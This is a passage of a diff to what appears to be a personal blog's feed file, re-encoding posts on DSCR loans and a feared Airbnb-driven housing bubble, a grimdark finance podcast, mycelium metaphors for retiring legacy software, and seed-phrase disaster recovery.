+<h3 id="limitations-of-dscr-loans">Limitations of DSCR Loans:</h3>
+
+<ul>
+  <li><strong>Larger required down payments due to perceived lender risk:</strong> Given the unconventional nature of DSCR loans, lenders often require heftier down payments to offset potential risks associated with property-based revenue.</li>
+  <li><strong>Limited financing with a cap on loan amounts:</strong> There’s a ceiling to how much one can borrow under DSCR loans, restricting investors from procuring high-valued properties or multiple assets simultaneously.</li>
+  <li><strong>Cash reserve requirements to mitigate periods without bookings:</strong> Lenders may stipulate a certain amount be kept in reserve, ensuring loan repayment continues even during dry spells without property bookings.</li>
+  <li><strong>Risk of further debt due to lack of cash flow from vacant properties:</strong> The inherent nature of these loans means that extended vacancies can lead to cash flow issues, potentially pushing investors deeper into debt without consistent rental income.</li>
+</ul>
+
+<h3 id="the-rising-problem-with-dscr-loans-and-airbnb">The Rising Problem with DSCR Loans and Airbnb</h3>
+
+<p>DSCR loans, designed to ease the investment process in short-term rental properties, have become a double-edged sword in today’s volatile market landscape. The allure of these loans, especially in platforms like Airbnb, lies in their property-based financing approach. <a href="https://www.moodysanalytics.com/-/media/whitepaper/2011/11-03-05-Modeling-CRE-Loan-Credit-Risk-An-Overview.pdf">However, this very advantage could morph into a formidable risk during market downturns</a>. During such downturns, properties, particularly those in the short-term rental market, are susceptible to underperformance, making them less profitable. If a substantial portion of these loans faces this underperformance simultaneously, the market could witness a domino effect leading to a significant number of foreclosures. This ripple effect, induced by unfavorable market conditions, can thus pose a macroscopic threat to the broader housing and financial markets. \</p>
+
+<h3 id="a-nyc-case-study">A NYC Case Study</h3>
+
+<p>In recent times, <a href="https://www.investopedia.com/new-york-city-enforces-de-facto-ban-of-airbnbs-7967344#:~:text=The%20law%20requires%20short%2Dterm,for%20unregistered%20short%2Dterm%20rentals.">New York City has emerged as a significant battleground for the short-term rental debate</a>, exemplifying the tensions that arise from platforms like Airbnb in major urban hubs. The city officials introduced stringent regulations aimed at platforms like Airbnb, clamping down on what they perceive as destabilizing factors in the housing market. These regulations are grounded in the city’s argument that short-term rentals, facilitated by platforms like Airbnb, are exacerbating housing shortages and inflating rents. Airbnb, on the other hand, views these regulations as an overly restrictive move, almost tantamount to a “de facto ban” on their platform. They argue that the city is caving to the pressures of the hotel lobby and unduly limiting affordable accommodation options for tourists.</p>
 
-&lt;p&gt;##$$ Meet the Void Pool Hosts
-Void Pool stands out, not just because of its thematic richness, but because of the formidable hosts that anchor its narrative:&lt;/p&gt;
+<p>Complicating this dynamic further are NYC’s pre-existing laws on short-term rentals. While the city has maintained that rentals for less than 30 days without the host present are illegal, Airbnb and similar platforms often feature listings that directly contradict these laws. The city’s main contention is that platforms like Airbnb are not effectively policing their site, allowing for a surge in these illegal short-term rentals. Recent data underscores this tension, with officials estimating <a href="https://www.nytimes.com/2023/09/05/nyregion/airbnb-regulations-nyc-housing.html#:~:text=City%20officials%20estimated%20there%20were,more%20expensive%20to%20live%20here.">nearly 10,800 Airbnb listings in NYC as of March 2023 to be in violation of these laws</a>.</p>
 
-&lt;h3 id=&quot;void-lord&quot;&gt;Void Lord&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../assets/image/void-lord-void-pool.png&quot; alt=&quot;void-lord-void-pool&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+<p>This ongoing tussle encapsulates the broader global discourse on balancing housing needs, tourism demands, and <a href="https://voiceofsandiego.org/2021/01/26/platform-accountability-should-be-central-to-vacation-rental-plan/">platform accountability</a>.</p>
 
-&lt;p&gt;Drenched in the high-pressure hustle of Wall Street and honed amidst the innovative echelons of Google, Void Lord is no ordinary voice in the cacophony of financial and tech commentators. With a seasoned background that spans the ruthless trading floors to the dynamic brainstorming rooms of Silicon Valley, he stands as a testament to a life lived at the confluence of money and machines.&lt;/p&gt;
+<h2 id="macroeconomic-effects-of-dscr-loans-for-short-term-rentals">Macroeconomic Effects of DSCR Loans for Short-Term Rentals</h2>
 
-&lt;p&gt;His journey started in the fast-paced universe of Wall Street, where numbers dance with decisions, and milliseconds can mean millions. Here, Void Lord mastered the art of economic forecasting, equity analysis, and the nuanced game of investment. This world shaped his analytical rigor and gave him a firsthand understanding of the global financial machinery in all its glory and its complexity.&lt;/p&gt;
+<p>The allure of short-term rentals, propelled by platforms like Airbnb and the attractive financing options offered by DSCR loans, has enticed a significant number of investors into the housing market. However, this burgeoning enthusiasm may be sowing the seeds for a potential macroeconomic crisis. At the core of this concern lies the financial commitments Airbnb owners have undertaken. These property owners, lured by the promise of steady and lucrative returns, might not be fully prepared for the volatility and risks associated with property investments. When these owners are faced with unfavorable market conditions, be it due to regulatory changes, an economic downturn, or decreased tourism, their primary source of revenue—short-term rentals—can take a substantial hit. Without this consistent flow of income, meeting their financial obligations becomes challenging, leading many to the precipice of foreclosure.</p>
 
-&lt;p&gt;Yet, the tech allure was irresistible. Moving on to Google, Void Lord delved deep into the digital age’s transformative powers. He was no longer just observing the financial trends but was at the forefront of shaping the technological innovations that would redefine industries. At Google, he witnessed, contributed to, and often led initiatives that intertwined finance with the most disruptive tech solutions. From developing algorithms that predict market shifts based on search trends, to understanding the monetary implications of emerging technologies like AI and quantum computing, Void Lord’s experiences in Google elevated his expertise to a whole new dimension.&lt;/p&gt;
+<p>The cascade effect that can result from this scenario is alarming. If a significant portion of Airbnb owners find themselves unable to sustain their property investments due to declining revenues, the market could see a sudden surge in properties being listed for sale. This mass unloading of investment properties can saturate the housing market, driving property prices down. In a balanced market, occasional property sales do not dramatically affect overall prices. However, when there is an overwhelming influx of properties being listed almost simultaneously, it exerts downward pressure on property valuations.</p>
 
-&lt;p&gt;In “Void Pool,” this unique blend of financial acumen and tech savvy comes alive. Void Lord offers insights that are not mere observations but are reflections born from a life immersed in both worlds. His discussions bridge the often seemingly disparate universes of finance and tech, highlighting intersections, dispelling myths, and paving the way for a future where these realms are inextricably linked.&lt;/p&gt;
+<p>This deluge of property listings and the subsequent drop in housing prices can have a reverberating impact on the broader economy, leading to reduced consumer confidence, diminished construction activities, and potential job losses in the real estate and associated sectors. The drop in property values could also lead to underwater mortgages where homeowners owe more on their mortgages than their homes are worth, further exacerbating the financial strain on households.</p>
 
-&lt;p&gt;For listeners eager to decipher the future of money in an age of rapid technological evolution, Void Lord’s voice offers a beacon, guiding them through the intricate maze where finance meets the future.&lt;/p&gt;
+<p><strong>In this macroeconomic context, the mass unloading of properties, primarily driven by short-term rental investors, might indeed be a tipping point, <span style="text-decoration:underline;">potentially triggering a pop in the housing bubble</span>, with ramifications echoing those witnessed during previous housing crises.</strong></p>
 
-&lt;h3 id=&quot;void-knight&quot;&gt;Void Knight&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../assets/image/void-knight-void-pool.png&quot; alt=&quot;void-knight-void-pool&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+<h3 id="bursting-the-dscr-bubble">Bursting the DSCR Bubble</h3>
 
-&lt;p&gt;In the ever-evolving landscape of the digital age, few have navigated the intricate nexuses of fintech, cybersecurity, and defense as adeptly as Void Knight. His multifaceted journey, which began in the innovative chambers of Intuit, took a deep dive into the intense world of cybersecurity with a startup born from the legendary Israeli 8200 intelligence unit, and further branched out into the complex realm of defense. This rich tapestry of experiences makes Void Knight a voice of authority, discernment, and depth.&lt;/p&gt;
+<p>The expanding role of DSCR loans, particularly in the realm of short-term rentals facilitated by platforms like Airbnb, is undeniably reshaping the housing landscape. While these financial instruments offer unparalleled opportunities for investors, they simultaneously plant seeds of vulnerability in our economic fabric. The intertwined dynamics of property-based lending, short-term rental market fluctuations, and broader housing demand patterns construct a precarious structure. The recent developments in New York City further highlight the friction between urban housing policies, short-term rental platforms, and the increasing investor inclination toward these properties, all fueled by the allure of DSCR loans.</p>
 
-&lt;p&gt;At Intuit, the world of fintech unfolded before him. It was here that Void Knight honed his expertise in the mechanics of digital finance, exploring the nuances of how technology was reshaping the ways we think about, use, and secure money. This foundation in fintech gave him a lens to view money not just as a transactional tool but as a transformative force in the modern world.&lt;/p&gt;
+<p>The evidence laid out paints a cautionary tale of an impending housing bubble, reminiscent of the subprime crisis of 2008. Investors, now more than ever, should proceed with due diligence, understanding both the benefits and potential pitfalls of DSCR loan-backed investments. Simultaneously, policymakers must be proactive in their approach, formulating regulations that strike a delicate balance between promoting short-term rental businesses and ensuring housing market stability.</p>
 
-&lt;p&gt;However, it was his tenure with the Israeli 8200 founded startup that truly set Void Knight apart. The 8200 unit, Israel’s elite intelligence corps, is often equated with America’s NSA in its prominence in cybersecurity and signals intelligence. Working with a startup that had its roots in such a prestigious unit, Void Knight delved deep into the world of digital defense, combating threats in the ever-blurring lines between the digital and physical realms. It was here that he realized that the safekeeping of money in the digital age went beyond firewalls and encryptions—it was a strategic dance involving politics, espionage, and a new kind of warfare.&lt;/p&gt;
+<p>In navigating the future, it’s imperative for stakeholders, from investors to regulators, to critically assess the evolving housing market landscape and the role DSCR loans play within it. A collective call to action is required to avert a potential crisis, ensuring that the pursuit of investment opportunities doesn’t inadvertently catalyze the bursting of yet another housing bubble.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[I have become increasingly convinced that we are witnessing the formation of a new subprime mortgage bubble. Drawing parallels to the dynamics that led to the devastating financial crisis of 2008, fueled by rampant subprime mortgage issuance, I see a similar storm brewing due to the aggressive overissuance of DSCR (Debt Service Coverage Ratio) loans. If unchecked, this trend could set the stage for another financial upheaval with lasting repercussions for the housing market and the broader economy.]]></summary></entry><entry><title type="html">Void Pool: Dive into the Abyss of Grimdark Finance</title><link href="http://localhost:4000/blog/void-pool-dive-into-the-abyss-of-grimdark-finance" rel="alternate" type="text/html" title="Void Pool: Dive into the Abyss of Grimdark Finance" /><published>2023-09-05T00:00:00-07:00</published><updated>2023-09-05T00:00:00-07:00</updated><id>http://localhost:4000/blog/void-pool-dive-into-the-abyss-of-grimdark-finance</id><content type="html" xml:base="http://localhost:4000/blog/void-pool-dive-into-the-abyss-of-grimdark-finance"><![CDATA[<p>Today, I present an enticing invitation to dive deep into the shadowy, interwoven realms of finance, politics, and technology. Enter Void Pool, a uniquely grimdark finance podcast that promises to be an illuminating journey like no other.</p>
 
-&lt;p&gt;Tying his insights from fintech and cybersecurity, his foray into defense gave him an eagle-eye perspective on the geopolitical intricacies of our times. Money, security, politics—these weren’t isolated domains but deeply intertwined arenas where decisions in one ripple into consequences in another.&lt;/p&gt;
+<p>##$$ Meet the Void Pool Hosts
+Void Pool stands out, not just because of its thematic richness, but because of the formidable hosts that anchor its narrative:</p>
 
-&lt;p&gt;On the “Void Pool” podcast, Void Knight’s discussions are a testament to this interconnectedness. He does not just provide commentary; he decodes the matrix. He demystifies the often overwhelming webs of connections between money flows, cyber threats, and global political strategies. For listeners seeking to understand the broader implications of a cyberattack, or the geopolitical consequences of fintech innovations, Void Knight offers a comprehensive, informed, and deeply analytical perspective.&lt;/p&gt;
+<h3 id="void-lord">Void Lord</h3>
+<p><img src="../../../../../assets/image/void-lord-void-pool.png" alt="void-lord-void-pool" class="img-responsive" /></p>
 
-&lt;p&gt;In a world of silos, Void Knight breaks walls, forging a narrative that transcends boundaries and offers listeners an unparalleled understanding of the future of money, security, and geopolitics.&lt;/p&gt;
+<p>Drenched in the high-pressure hustle of Wall Street and honed amidst the innovative echelons of Google, Void Lord is no ordinary voice in the cacophony of financial and tech commentators. With a seasoned background that spans the ruthless trading floors to the dynamic brainstorming rooms of Silicon Valley, he stands as a testament to a life lived at the confluence of money and machines.</p>
 
-&lt;h3 id=&quot;what-can-you-expect&quot;&gt;What Can You Expect?&lt;/h3&gt;
-&lt;p&gt;Void Pool bridges the gap between economics and real-world applications, combining rigorous economic analysis with discussions on current events, politics, and prospective futures. It’s not just about understanding the world but about shaping and improving our lives amidst the ever-changing landscape.&lt;/p&gt;
+<p>His journey started in the fast-paced universe of Wall Street, where numbers dance with decisions, and milliseconds can mean millions. Here, Void Lord mastered the art of economic forecasting, equity analysis, and the nuanced game of investment. This world shaped his analytical rigor and gave him a firsthand understanding of the global financial machinery in all its glory and its complexity.</p>
 
-&lt;p&gt;Though &lt;a href=&quot;https://www.investopedia.com/top-10-personal-finance-podcasts-5088034&quot;&gt;there is no shortage of finance podcasts to choose from&lt;/a&gt;, Void Pool stands as it brings in elements of dark fantasy to demonstrate basic principles. The grimdark theme ensures that the podcast maintains an authentic touch, addressing complex subjects without sugar-coating, thus preparing listeners for the challenges of the real world.&lt;/p&gt;
+<p>Yet, the tech allure was irresistible. Moving on to Google, Void Lord delved deep into the digital age’s transformative powers. He was no longer just observing the financial trends but was at the forefront of shaping the technological innovations that would redefine industries. At Google, he witnessed, contributed to, and often led initiatives that intertwined finance with the most disruptive tech solutions. From developing algorithms that predict market shifts based on search trends, to understanding the monetary implications of emerging technologies like AI and quantum computing, Void Lord’s experiences in Google elevated his expertise to a whole new dimension.</p>
 
-&lt;h3 id=&quot;why-plug-into-void-pool&quot;&gt;Why Plug Into Void Pool?&lt;/h3&gt;
-&lt;p&gt;In our hyperconnected era, it’s no longer sufficient to understand just one aspect of the world. Void Pool offers:&lt;/p&gt;
+<p>In “Void Pool,” this unique blend of financial acumen and tech savvy comes alive. Void Lord offers insights that are not mere observations but are reflections born from a life immersed in both worlds. His discussions bridge the often seemingly disparate universes of finance and tech, highlighting intersections, dispelling myths, and paving the way for a future where these realms are inextricably linked.</p>
 
-&lt;p&gt;&lt;strong&gt;Comprehensive Insights:&lt;/strong&gt; In an age where the lines between politics, society, and economics are increasingly blurred, it’s critical to have a holistic understanding of global events. Void Pool doesn’t just regurgitate the news; it interprets, analyzes, and predicts, helping you be better prepared for what’s next.&lt;/p&gt;
+<p>For listeners eager to decipher the future of money in an age of rapid technological evolution, Void Lord’s voice offers a beacon, guiding them through the intricate maze where finance meets the future.</p>
 
-&lt;p&gt;&lt;strong&gt;Practical Wisdom:&lt;/strong&gt; The podcast doesn’t shy away from the harsh realities and complexities of the modern world, making for a listening experience that is as intellectually stimulating as it is emotionally resonant. Void Pool help listeners navigate and leverage economic shifts in daily life.&lt;/p&gt;
+<h3 id="void-knight">Void Knight</h3>
+<p><img src="../../../../../assets/image/void-knight-void-pool.png" alt="void-knight-void-pool" class="img-responsive" /></p>
 
-&lt;p&gt;&lt;strong&gt;Entertainment:&lt;/strong&gt; With bonus content like comics and news, the learning is not just profound but also enjoyable.
-In essence, it’s a complete package that elevates your understanding while keeping you entertained.&lt;/p&gt;
+<p>In the ever-evolving landscape of the digital age, few have navigated the intricate nexuses of fintech, cybersecurity, and defense as adeptly as Void Knight. His multifaceted journey, which began in the innovative chambers of Intuit, took a deep dive into the intense world of cybersecurity with a startup born from the legendary Israeli 8200 intelligence unit, and further branched out into the complex realm of defense. This rich tapestry of experiences makes Void Knight a voice of authority, discernment, and depth.</p>
 
-&lt;h3 id=&quot;stay-in-the-loop-with-void-pool&quot;&gt;Stay in the Loop with Void Pool!&lt;/h3&gt;
-&lt;p&gt;To ensure you never miss out on their gripping discussions, news, or the exclusive comics, follow them on &lt;a href=&quot;https://twitter.com/void_pool&quot;&gt;Void Pool Twitter&lt;/a&gt;.&lt;/p&gt;
+<p>At Intuit, the world of fintech unfolded before him. It was here that Void Knight honed his expertise in the mechanics of digital finance, exploring the nuances of how technology was reshaping the ways we think about, use, and secure money. This foundation in fintech gave him a lens to view money not just as a transactional tool but as a transformative force in the modern world.</p>
 
-&lt;h4 id=&quot;dive-into-the-abyss-of-grimdark-finance&quot;&gt;Dive into the Abyss of Grimdark Finance&lt;/h4&gt;
-&lt;p&gt;Void Pool is more than just a podcast—it’s a movement, a philosophy, a guide to the mysteries of the financial world, and beyond. I invite you to embark on this journey with Void Lord and Void Knight. Equip yourself with the knowledge and wisdom that goes beyond the mundane and dives deep into the abyss.&lt;/p&gt;
+<p>However, it was his tenure with the Israeli 8200 founded startup that truly set Void Knight apart. The 8200 unit, Israel’s elite intelligence corps, is often equated with America’s NSA in its prominence in cybersecurity and signals intelligence. Working with a startup that had its roots in such a prestigious unit, Void Knight delved deep into the world of digital defense, combating threats in the ever-blurring lines between the digital and physical realms. It was here that he realized that the safekeeping of money in the digital age went beyond firewalls and encryptions—it was a strategic dance involving politics, espionage, and a new kind of warfare.</p>
 
-&lt;p&gt;&lt;a href=&quot;https://pnc.st/s/void-pool&quot;&gt;Listen to Void Pool today&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Today, I present an enticing invitation to dive deep into the shadowy, interwoven realms of finance, politics, and technology. Enter Void Pool, a uniquely grimdark finance podcast that promises to be an illuminating journey like no other.</summary></entry><entry><title type="html">Mycelial Lessons for Securing the Software Supply Chain</title><link href="http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" rel="alternate" type="text/html" title="Mycelial Lessons for Securing the Software Supply Chain" /><published>2023-02-10T00:00:00-08:00</published><updated>2023-02-10T00:00:00-08:00</updated><id>http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain</id><content type="html" xml:base="http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain">&lt;p&gt;Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.&lt;/p&gt;
+<p>Tying his insights from fintech and cybersecurity, his foray into defense gave him an eagle-eye perspective on the geopolitical intricacies of our times. Money, security, politics—these weren’t isolated domains but deeply intertwined arenas where decisions in one ripple into consequences in another.</p>
 
-&lt;p&gt;Tech debt refers to the cost of maintaining and updating older software systems that are no longer supported or have become obsolete. This can be a significant burden on organizations, as they must devote resources to maintaining and updating systems that are no longer providing the desired functionality or performance. In the same way, dead and old material in a forest can become an obstacle to growth and progress.&lt;/p&gt;
+<p>On the “Void Pool” podcast, Void Knight’s discussions are a testament to this interconnectedness. He does not just provide commentary; he decodes the matrix. He demystifies the often overwhelming webs of connections between money flows, cyber threats, and global political strategies. For listeners seeking to understand the broader implications of a cyberattack, or the geopolitical consequences of fintech innovations, Void Knight offers a comprehensive, informed, and deeply analytical perspective.</p>
 
-&lt;p&gt;I’m lucky enough to live in San Francisco, in the heart of the redwood coast. I’ve recently had luck foraging mycorrhizal mushrooms that grow in abundance here.&lt;/p&gt;
+<p>In a world of silos, Void Knight breaks walls, forging a narrative that transcends boundaries and offers listeners an unparalleled understanding of the future of money, security, and geopolitics.</p>
 
-&lt;p&gt;&lt;img src=&quot;../../../../../assets/image/mycelial-lessons-software-supply-chain-security.jpg&quot; alt=&quot;bag full of mushrooms foraged on the redwood coast, including boletes and chanterelles&quot; title=&quot;bag full of mushrooms foraged on the redwood coast, including boletes and chanterelles&quot; /&gt;&lt;/p&gt;
+<h3 id="what-can-you-expect">What Can You Expect?</h3>
+<p>Void Pool bridges the gap between economics and real-world applications, combining rigorous economic analysis with discussions on current events, politics, and prospective futures. It’s not just about understanding the world but about shaping and improving our lives amidst the ever-changing landscape.</p>
 
-&lt;p&gt;The relationship these mushrooms have with their environment made me realize several things about software supply chain security.&lt;/p&gt;
+<p>Though <a href="https://www.investopedia.com/top-10-personal-finance-podcasts-5088034">there is no shortage of finance podcasts to choose from</a>, Void Pool stands as it brings in elements of dark fantasy to demonstrate basic principles. The grimdark theme ensures that the podcast maintains an authentic touch, addressing complex subjects without sugar-coating, thus preparing listeners for the challenges of the real world.</p>
 
-&lt;h3 id=&quot;mycelial-lessons-in-handling-tech-debt&quot;&gt;Mycelial Lessons in Handling Tech Debt&lt;/h3&gt;
+<h3 id="why-plug-into-void-pool">Why Plug Into Void Pool?</h3>
+<p>In our hyperconnected era, it’s no longer sufficient to understand just one aspect of the world. Void Pool offers:</p>
 
-&lt;p&gt;Just as fungus helps to break down dead and old material in the forest, legacy software can also be broken down and replaced with new software that is better suited to the organization’s needs. This replacement process can be challenging, as it requires a significant investment of time and resources. But, in the long run, it can save organizations a great deal of money and improve their overall efficiency.&lt;/p&gt;
+<p><strong>Comprehensive Insights:</strong> In an age where the lines between politics, society, and economics are increasingly blurred, it’s critical to have a holistic understanding of global events. Void Pool doesn’t just regurgitate the news; it interprets, analyzes, and predicts, helping you be better prepared for what’s next.</p>
 
-&lt;p&gt;One way to approach the process of replacing legacy software is to take a phased approach, similar to how a forest will decompose a fallen tree. Instead of trying to replace all the software at once, organizations can start by replacing the most critical systems first, and then gradually work their way through the rest of the software. This can minimize the risk of disruption to the organization’s operations while also allowing them to take advantage of the benefits of new software more quickly.&lt;/p&gt;
+<p><strong>Practical Wisdom:</strong> The podcast doesn’t shy away from the harsh realities and complexities of the modern world, making for a listening experience that is as intellectually stimulating as it is emotionally resonant. Void Pool help listeners navigate and leverage economic shifts in daily life.</p>
 
-&lt;p&gt;In conclusion, just as fungus plays a vital role in breaking down dead and old material in forests, it can also help us to learn how to replace legacy software and eliminate tech debt. Organizations can minimize disruption and improve efficiency by taking a phased approach and focusing on critical systems first. By breaking down tech debt, organizations can free up resources to invest in more strategic initiatives. This can lead to more innovation, better performance, and better end-user experience.&lt;/p&gt;
+<p><strong>Entertainment:</strong> With bonus content like comics and news, the learning is not just profound but also enjoyable.
+In essence, it’s a complete package that elevates your understanding while keeping you entertained.</p>
 
-&lt;h3 id=&quot;benefits-of-deprecating-legacy-software&quot;&gt;Benefits of Deprecating Legacy Software&lt;/h3&gt;
+<h3 id="stay-in-the-loop-with-void-pool">Stay in the Loop with Void Pool!</h3>
+<p>To ensure you never miss out on their gripping discussions, news, or the exclusive comics, follow them on <a href="https://twitter.com/void_pool">Void Pool Twitter</a>.</p>
 
-&lt;h4 id=&quot;lesson-1-break-down-old-dead-material&quot;&gt;Lesson 1) Break Down Old, Dead Material&lt;/h4&gt;
+<h4 id="dive-into-the-abyss-of-grimdark-finance">Dive into the Abyss of Grimdark Finance</h4>
+<p>Void Pool is more than just a podcast—it’s a movement, a philosophy, a guide to the mysteries of the financial world, and beyond. I invite you to embark on this journey with Void Lord and Void Knight. Equip yourself with the knowledge and wisdom that goes beyond the mundane and dives deep into the abyss.</p>
 
-&lt;p&gt;The mycelium’s relationship with decay highlights the importance of continuously removing dead and old material to support growth and progress. In a similar way, deprecating and replacing legacy software with modern software built adhering to modern security standards can help improve software supply chain security by reducing the risk of vulnerabilities and attacks.&lt;/p&gt;
+<p><a href="https://pnc.st/s/void-pool">Listen to Void Pool today</a></p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[Today, I present an enticing invitation to dive deep into the shadowy, interwoven realms of finance, politics, and technology. Enter Void Pool, a uniquely grimdark finance podcast that promises to be an illuminating journey like no other.]]></summary></entry><entry><title type="html">Mycelial Lessons for Securing the Software Supply Chain</title><link href="http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" rel="alternate" type="text/html" title="Mycelial Lessons for Securing the Software Supply Chain" /><published>2023-02-10T00:00:00-08:00</published><updated>2023-02-10T00:00:00-08:00</updated><id>http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain</id><content type="html" xml:base="http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain"><![CDATA[<p>Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.</p>
 
-&lt;p&gt;In addition, modern software is updated regularly with security patches and new features, helping to keep systems secure and prevent security incidents. By replacing legacy software with modern software, organizations can take advantage of the latest security protocols and technologies, reducing the risk of cyberattacks and data breaches. This, in turn, helps to build trust in the software supply chain and ensures that sensitive information is protected from cyber threats. Overall, the benefits of modern software for software supply chain security are significant, and organizations that prioritize deprecating and replacing legacy software are well-positioned to protect their digital assets and maintain a strong security posture.&lt;/p&gt;
+<p>Tech debt refers to the cost of maintaining and updating older software systems that are no longer supported or have become obsolete. This can be a significant burden on organizations, as they must devote resources to maintaining and updating systems that are no longer providing the desired functionality or performance. In the same way, dead and old material in a forest can become an obstacle to growth and progress.</p>
 
-&lt;h4 id=&quot;lesson-2-adapt-and-evolve&quot;&gt;Lesson 2) Adapt and Evolve&lt;/h4&gt;
+<p>I’m lucky enough to live in San Francisco, in the heart of the redwood coast. I’ve recently had luck foraging mycorrhizal mushrooms that grow in abundance here.</p>
 
-&lt;p&gt;The mycelium’s ability to adapt and evolve in response to changes in its environment is a powerful example of resilience and the importance of continuous improvement. Deprecating and replacing legacy software with modern software built to meet today’s security standards can improve the resilience of the software supply chain and increase its ability to respond to changing threats and vulnerabilities.&lt;/p&gt;
+<p><img src="../../../../../assets/image/mycelial-lessons-software-supply-chain-security.jpg" alt="bag full of mushrooms foraged on the redwood coast, including boletes and chanterelles" title="bag full of mushrooms foraged on the redwood coast, including boletes and chanterelles" /></p>
 
-&lt;p&gt;Modern software is built to adhere to current security standards and is designed to address the latest security threats. For example, modern software may include features like encryption, multi-factor authentication, and firewalls to prevent unauthorized access to sensitive information. These features help to prevent cyberattacks and reduce the risk of data breaches.&lt;/p&gt;
+<p>The relationship these mushrooms have with their environment made me realize several things about software supply chain security.</p>
 
-&lt;h4 id=&quot;lesson-3-support-growth-and-renewal&quot;&gt;Lesson 3) Support Growth and Renewal&lt;/h4&gt;
+<h3 id="mycelial-lessons-in-handling-tech-debt">Mycelial Lessons in Handling Tech Debt</h3>
 
-&lt;p&gt;The mycelium’s role in breaking down dead and old material to support growth and renewal is similar to the role of deprecating and replacing legacy software in promoting software supply chain security. By removing older, unsupported software and replacing it with modern software built to meet current security standards, organizations can reduce their risk of attacks and increase their ability to respond to changing security threats. This can help ensure the long-term health and security of the software supply chain.&lt;/p&gt;
+<p>Just as fungus helps to break down dead and old material in the forest, legacy software can also be broken down and replaced with new software that is better suited to the organization’s needs. This replacement process can be challenging, as it requires a significant investment of time and resources. But, in the long run, it can save organizations a great deal of money and improve their overall efficiency.</p>
 
-&lt;p&gt;Deprecating and replacing legacy software with modern software built with modern security standards is critical for the security of the software supply chain. Legacy software systems, by their very nature, are vulnerable to exploitation due to outdated security protocols, lack of security updates, and other factors. These systems can easily become a target for cyberattacks, leading to data breaches, theft of sensitive information, and other security incidents.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.</summary></entry><entry><title type="html">Disaster Recovery Drills in Web 3.0</title><link href="http://localhost:4000/blog/disaster-recovery-drills-in-web-3" rel="alternate" type="text/html" title="Disaster Recovery Drills in Web 3.0" /><published>2022-06-12T00:00:00-07:00</published><updated>2022-06-12T00:00:00-07:00</updated><id>http://localhost:4000/blog/disaster-recovery-drills-web-3</id><content type="html" xml:base="http://localhost:4000/blog/disaster-recovery-drills-in-web-3">&lt;p&gt;I spent several hours tracking down a small notebook earlier this week. The reason? I wrote down my seed phrases in this tiny notebook, which I carelessly tracked. Why am I telling you this? This management strategy is a horrible practice. Had I not performed a disaster recovery drill for my digital assets, I might’ve continued storing my seed phrase insecurely. Disaster recovery drills are foundational for security in web 3.0 and enable continued access to blockchain assets.&lt;/p&gt;
+<p>One way to approach the process of replacing legacy software is to take a phased approach, similar to how a forest will decompose a fallen tree. Instead of trying to replace all the software at once, organizations can start by replacing the most critical systems first, and then gradually work their way through the rest of the software. This can minimize the risk of disruption to the organization’s operations while also allowing them to take advantage of the benefits of new software more quickly.</p>
 
-&lt;h2 id=&quot;web-3-wallet-security-basics&quot;&gt;Web 3 Wallet Security Basics&lt;/h2&gt;
+<p>In conclusion, just as fungus plays a vital role in breaking down dead and old material in forests, it can also help us to learn how to replace legacy software and eliminate tech debt. Organizations can minimize disruption and improve efficiency by taking a phased approach and focusing on critical systems first. By breaking down tech debt, organizations can free up resources to invest in more strategic initiatives. This can lead to more innovation, better performance, and better end-user experience.</p>
 
-&lt;p&gt;Securing your seed phrase is foundational to security because the seed phrase is the &lt;a href=&quot;https://getcoinplate.com/blog/is-a-seed-phrase-the-same-as-a-private-key-the-ultimate-guide-to-private-keys-and-recovery-seed-phrases/&quot;&gt;cryptographic basis for accessing the wallet&lt;/a&gt;. The seed phrase represents a long string of random numbers — and your wallet uses it to generate the private keys that let you send and spend your crypto. Individuals and institutions should securely secure their wallet seed phrases in multiple locations and, ideally, partitioned. Without the seed phrase, wallet owners will have no recourse for recovering their wallets.&lt;/p&gt;
+<h3 id="benefits-of-deprecating-legacy-software">Benefits of Deprecating Legacy Software</h3>
 
-&lt;p&gt;There are well-established standards for &lt;a href=&quot;https://www.coinbase.com/learn/crypto-basics/what-is-a-seed-phrase&quot;&gt;storing seed phrases&lt;/a&gt;. The best practices boil down to:&lt;/p&gt;
+<h4 id="lesson-1-break-down-old-dead-material">Lesson 1) Break Down Old, Dead Material</h4>
 
-&lt;ul&gt;
-  &lt;li&gt;Store your seed phase in multiple locations.&lt;/li&gt;
-  &lt;li&gt;Ensure access to your seed phrase is sufficiently restricted.&lt;/li&gt;
-  &lt;li&gt;If feasible, &lt;a href=&quot;https://bitcoin.stackexchange.com/questions/60540/practical-way-to-split-a-bip39-seed-into-a-2-out-of-3-factor-auth&quot;&gt;only store parts of the seed phrase at any one site&lt;/a&gt; to avoid a single point of compromise.&lt;/li&gt;
-  &lt;li&gt;Factor in the possibility of a natural disaster–it may be worth creating etched plates to hold parts of a seed phrase rather than hoping pieces of paper survive a fire, flood, or other acts of g*d.&lt;/li&gt;
-  &lt;li&gt;Memorize your seed phrase–you could get hit by a bus, but if you can find a hardware wallet in heaven, you’ll have access to your digital assets. (This is obviously a joke – crypto degens don’t go to heaven)&lt;/li&gt;
-&lt;/ul&gt;
